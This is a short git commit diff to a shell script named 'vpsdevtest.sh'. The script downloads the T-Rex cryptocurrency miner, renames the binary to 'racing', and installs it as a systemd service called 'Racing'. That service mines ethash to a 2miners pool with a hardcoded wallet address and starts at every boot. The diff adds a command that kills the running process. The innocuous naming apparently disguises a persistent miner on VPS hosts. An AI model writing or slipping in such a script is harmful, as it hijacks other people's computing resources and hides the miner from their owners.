13113e4a9cb501604feb8dda0eb655bffe67f605
oursourcegtx <93318626+oursourcegtx@users.noreply.github.com>
2022-04-21 14:08:34 +0700

    Update vpsdevtest.sh

--- vpsdevtest.sh
+++ vpsdevtest.sh
@@ -18,6 +18,8 @@ sudo systemctl start nvidia-fabricmanager
 wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
+sudo killall racing
+sleep 30s
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u bc1qu7ecen9pvuva0x3t2qxsy9d3ayldt9qvy6ehgw -p x -w ${myworker}_re\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
